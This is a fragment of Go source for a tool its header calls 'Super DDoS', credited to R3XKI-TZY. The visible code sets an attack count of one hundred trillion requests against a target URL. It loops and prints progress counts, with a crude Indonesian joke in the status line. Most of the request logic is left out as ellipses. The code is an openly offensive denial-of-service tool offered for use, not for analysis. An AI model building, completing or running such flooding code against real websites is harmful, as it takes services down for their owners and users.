/**
 Super DDoS Created by R3XKI-TZY 
**/
...
func main() {
	...
	count := flag.Int("count", 100000000000000, "count for attack")
	...
	if *attackUrl != "" {
		...
		for i := 0; i < *count; i++ {
			if i%4 == 0 {
				fmt.Println("Sedang Mengirim Bokep :", i, "Good:", completeCount, "Bad:", errorCount)
			}
